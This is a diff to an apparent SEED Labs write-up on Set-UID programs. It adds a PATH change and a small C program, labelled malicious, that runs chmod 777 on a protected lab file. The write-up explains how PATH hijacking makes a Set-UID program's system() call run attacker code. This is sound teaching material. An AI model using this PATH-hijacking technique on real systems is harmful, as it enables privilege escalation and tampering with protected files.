@@ -83,7 +83,22 @@ Calling system() within a Set-UID program is quite dangerous, since the behavior
 In Bash, the PATH environment variable can be changed by running the code below:
 
 ```SHELL
-export PATH=/home/seed:$PATH
+export PATH=/home/seed/Documents/seed-labs-master/category-software/Environment_Variable_and_SetUID/Labsetup:$PATH
+```
+
+In the lab we created our malicious program that is shown below:
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+
+    printf("Malicious code\n");
+    system("chmod 777 /home/seed/Documents/seed-labs-master/category-software/Environment_Variable_and_SetUID/Labsetup/important_file");
+
+    return 0;
+}
 ```
 
 By altering the PATH environment variable to include a directory where a malicious script or binary with the same name as the intended command (in this case, ls) is located, the system will execute the malicious code instead of the intended command when the Set-UID program is invoked.
